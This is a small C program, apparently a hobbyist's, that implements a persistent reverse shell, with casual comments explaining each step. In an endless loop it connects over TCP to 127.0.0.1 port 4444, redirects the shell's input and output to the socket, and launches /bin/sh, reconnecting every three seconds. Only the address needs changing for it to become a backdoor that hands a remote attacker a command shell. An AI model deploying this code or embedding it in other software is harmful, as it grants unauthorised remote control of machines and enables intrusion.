#include <sys/socket.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/wait.h>

struct sockaddr_mine{
unsigned short fam;
unsigned short port;
unsigned int ip;
char padding[8];
};

int main(void){

while(1){
int sockhndl = socket(2, 1, 0); // 2 is AF_INET and 1 is SOCK_STREAM (TCP) and 0 is default of tcp somethin like that...

struct sockaddr_mine data;
memset(&data, 0, sizeof(data));
data.fam = AF_INET;
data.port = htons(4444);
data.ip = inet_addr("127.0.0.1");

if(connect(sockhndl, (struct sockaddr*)&data, sizeof(data)) == 0){
if(fork() == 0){
dup2(sockhndl, 0); // stdin to socket
dup2(sockhndl, 1); //stdout  "   "
dup2(sockhndl, 2); // stderror "  "

char *argv[] = {"/bin/sh", NULL};
execve("/bin/sh", argv, NULL); // for mac os use zsh its in /bin/sh
}
close(sockhndl);
wait(NULL); // wait 4 child to exit
}

sleep(3);
}

return 0;
}
